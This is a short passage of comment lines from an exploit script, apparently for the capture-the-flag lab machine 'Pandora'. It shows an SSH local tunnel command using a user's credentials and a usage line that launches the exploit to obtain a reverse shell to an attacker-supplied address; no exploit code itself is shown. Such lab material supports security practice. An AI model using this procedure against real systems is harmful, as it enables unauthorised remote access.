...
#
# Pre-req:
# Having credentials for one user d****l and start a local tunnel as follows:
#
# $ ssh -L 9090:127.0.0.1:80 d*****l@pandora.htb 
#
# Once SSH Local tunnel is created, launch the exploit to get a reverse shell
#
# Usage:
#
...
# └─$ python3 pandora.py -t 127.0.0.1 -p 9090 -a x.x.x.x -l yyyy
